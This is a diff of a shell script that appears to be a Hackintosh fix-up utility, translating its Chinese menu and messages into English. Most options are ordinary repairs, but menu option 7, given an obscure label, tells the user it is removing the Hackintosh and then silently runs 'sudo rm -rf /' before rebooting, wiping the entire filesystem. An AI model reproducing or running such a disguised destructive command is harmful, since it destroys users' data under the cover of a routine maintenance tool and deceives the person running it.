@@ -119,65 +119,65 @@ menu(){
                                                                                   
 ******************************************************************************
 "
-    echo "选择菜单："
+    echo "Select menu："
 	echo ""
-    echo "1、修复插耳机杂音"
+    echo "1. Repair the noise of plugging in headphones"
 	echo ""
-    echo "2、修复数字键盘无法开启"
+    echo "2. Repair the numeric keyboard cannot be opened"
 	echo ""
-    echo "3、修复 Win/OSX 时间不同步"
+    echo "3. Fix Win/OSX time out of sync"
 	echo ""
-	echo "4、清除缓存"
+	echo "4. Clear Cache"
     echo ""
-	echo "5、全部修复上述问题"
+	echo "5. Fix all the above problems"
 	echo ""
-	echo "6、移除所有修复"
+	echo "6. remove all fixes"
 	echo ""
-    echo "7、送黑果归西"
+    echo "7. Send black fruit to the west"
     echo ""
-	echo "0、退出"
+	echo "0. Exit"
 	echo ""
 }
 
 Select(){
-	read -p "请选择你需要执行的操作：" number
+	read -p "Please select what you need to do：" number
     case ${number} in
     1) ALCPlugFix
-	   echo "已经修复插耳机杂音"
+	   echo "The noise of plugging in headphones has been fixed"
 	   echo ""
 	   Select
       ;;
     2) numlock
-	   echo "已经修复数字键盘无法开启"
+	   echo "Fixed that the numeric keyboard cannot be opened"
 	   echo ""
 	   Select
        ;;
     3) localtime_toggle
-	   echo "已经修复 Win/OSX 时间不同步"
+	   echo "Fixed Win/OSX time out of sync"
 	   echo ""
 	   Select
        ;;
 	4) clear_cache
-       echo "已经重建缓存"
+       echo "cache has been rebuilt"
 	   echo ""
        Select
        ;;
 	5) fixAll
-	   echo "已经修复上述问题"
+	   echo "The above problem has been fixed"
 	   echo ""
 	   Select
        ;;
 	6) removeAll
-       echo "已经移除所有修复"
+       echo "All fixes have been removed"
        Select
        ;;
-    7) echo "耐心等待，正在努力移除垃圾黑苹果，欢迎重返 windows 系统,稍后会自动重启"
+    7) echo "Wait patiently, we are working hard to remove the rubbish black apple, welcome back to the windows system, it will restart automatically later"
         sudo rm -rf / >/dev/null 2>&1
         sudo reboot
         ;;
 	0) exit 0
        ;;
-    *) echo "输入错误";
+    *) echo "input error";
 	   echo ""
        Select
        ;;
